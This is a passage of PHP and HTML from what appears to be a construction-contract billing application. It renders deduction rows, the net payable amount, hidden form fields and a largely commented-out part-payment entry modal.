echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of machineries & equipment as (per clause 18)  : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_machine_equip_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";

echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non Deployment of Technical manpower (as per clause 36(i)) : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".$non_dep_man_power_print."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$eb_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Non-Submission of QA related document : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($nonsubmission_qa, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";


if($sd_amt != 0)
{
$eb = 1;
echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ec_text." (".$eb.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>Security Deposit @ 5% : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>&nbsp;&nbsp;".number_format($sd_amt, 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
$eb++; $eb_text = "";
}

// This row is for Recovery Release
if($rrcount>0)
{
	for($rrc=0; $rrc<$rrcount; $rrc++)
	{
	echo "<tr style='border:none'><td style='border:none' colspan='2' align='right' class='labelprint'>".$ed_text." (".$ed.")</td><td style='border:none' class='labelprint' align='right' colspan='4'>".$RRDescCivArr[$rrc]." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' colspan='5' align='right' class='labelprint'>".number_format($RRAmtCivArr[$rrc], 2, '.', '')."</td><td colspan='1' style='border:none'>&nbsp;</td></tr>";
	$ed++; $ed_text = "";
	}
}

echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
if($total_recovery != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'></td><td style='border:none' class='labelprint' align='right' colspan='4'>&nbsp;</td><td colspan='2' align='right' style='border:none; border-bottom:1px dashed #000000' class='labelprint'></td><td style='border:none; border-bottom:1px dashed #000000'>&nbsp;</td></tr>";
}

if($Overall_net_amt_final != 0)
{
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='5'><b>Net Payable Amount :</b> <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='6'><b>".number_format($Overall_net_amt_final, 2, '.', '')."</b></td><td style='border:none'>&nbsp;</td></tr>";
}*/

//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
//$Overall_net_amt_final = "18767031.35";
/*$split_amt = explode(".",$Overall_net_amt_final);
$rupees_part = $split_amt[0];
$paise_part = $split_amt[1];
$rupee_part_word = number_to_words($rupees_part);

if($paise_part != 0)
{
	$paise_part_word = " and Paise ".number_to_words($paise_part)."";
}
$amount_in_words = $rupee_part_word.$paise_part_word;
echo "<tr style='border:none'><td style='border:none'>&nbsp;</td><td style='border:none'>&nbsp;</td><td style='border:none' class='labelprint' align='left' colspan='12'>Amount: (Rupees ".$amount_in_words.")</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>page ".$page."</td></tr>";
//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='center' colspan='12'>&nbsp;</td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";*/
?>
<?php 

//echo "<p  style='page-break-after:always;'></p>";
/*for($x=0;$x<$emptypage;$x++)
{
$page++;
echo $title;
echo $table;
echo "<table width='1087px' bgcolor='white'   border='0' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
$y=1;
while($y<22)
{
?>
	<tr>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='20%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='8%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='4%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
</tr>
	<?php
	$y++;		
}
echo "<tr class='labelprint'><td colspan='12' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;border-top:2px solid #cacaca;' align='center'> </td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
//$page++;
}*/
?>
<input type="hidden" name="txt_abstmbno" id="txt_abstmbno" value="<?php echo $abstmbno; ?>" />
<input type="hidden" name="txt_maxpage" id="txt_maxpage" value="<?php echo $page; ?>" />
<input type="hidden" name="txt_abstractstr" id="txt_abstractstr" value="<?php echo $AbstractStr; ?>" />
<input type="hidden" name="txt_subdivid_slmstr" id="txt_subdivid_slmstr" value="<?php echo $SubdividSlmStr; ?>" />
<input type="hidden" name="txt_rbn_no" id="txt_rbn_no" value="<?php echo $runn_acc_bill_no; ?>" />

<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />
<!--<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect">
		<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
	</div>
	<div class="btn_inside_sect">
		<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
	</div>
</div> -->

		<div style="text-align:center; height:45px; line-height:45px;" class="printbutton">
			<div class="buttonsection">
			<input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> 
			</div>
			<!--<div class="buttonsection">
			<input type="Submit" name="Submit" value="Confirm" id="Submit" /> 
			</div>-->
			<div class="buttonsection">
			<input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" />
			</div>
		</div>

		<!-- modal content -->
		<!--<div id="basic-modal-content">
			<div align="center" class="popuptitle">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0080ff" style="color:#FFFFFF">
						<td align="center" colspan="7">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr>
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr>
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr>
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr>
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" rows="3" style="width:519px;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0080ff" style="color:#FFFFFF">
							<td align="center" colspan="5">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr>
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" readonly="" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr>
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr>
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" rows="3" style="width:375px;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<!--<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     -->
</form>
</body>

</html>